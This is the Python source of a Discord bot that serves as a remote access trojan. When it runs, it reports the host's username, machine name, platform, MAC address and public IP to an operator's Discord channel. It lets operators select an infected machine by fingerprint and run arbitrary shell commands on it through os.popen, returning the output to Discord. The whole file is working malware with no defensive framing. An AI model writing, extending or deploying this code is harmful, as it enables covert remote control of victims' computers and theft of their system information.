import discord
import settings

import os
import platform
from uuid import getnode
from requests import get
import hashlib

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

selected = False
selinfo = hashlib.md5((os.getlogin() + platform.node() + platform.platform() + str(getnode()) + get('https://api.ipify.org').content.decode('utf8')).encode('utf-8')).hexdigest()

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    ip = get('https://api.ipify.org').content.decode('utf8')
    channel = client.get_channel(settings.channel)
    await channel.send('**Connected!**\n```' +
        os.getlogin() + ' | ' + platform.node() + '\n' +
        'platform: ' + platform.platform() + '\n' +
        'MAC: ' + str(getnode()) + '\n' +
        'IP: ' + ip + '\n' +
        '```'
    )

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('$list'):
        ip = get('https://api.ipify.org').content.decode('utf8')
        await message.channel.send(os.getlogin() + ' | ' + platform.node() + '\n```' + 
            'platform: ' + platform.platform() + '\n' +
            'MAC: ' + str(getnode()) + '\n' +
            'IP: ' + ip + '\n' +
            '```' +
            selinfo + '\n' +
            '-'*64
        )

    if message.content.startswith('$select'):
        msg = message.content.split()
        indent = ''.join((msg[1]))
        global selected
        if selected == False:
            if indent == selinfo:
                selected = True
                await message.channel.send(indent + ' selected')
            else:
                await message.channel.send(indent + ' not found')
        else:
            selected = False

    if selected == True:
        if message.content.startswith('$cmd'):
            msg = message.content.split()
            cmd = ''.join((msg[1:]))
            out = os.popen(cmd).read()
            if len(out) > 2000:
                with open('message.txt', 'w') as f:
                    f.write(out)
                await message.channel.send(file=discord.File('message.txt'))
            else:
                await message.channel.send(out)

client.run(settings.token)
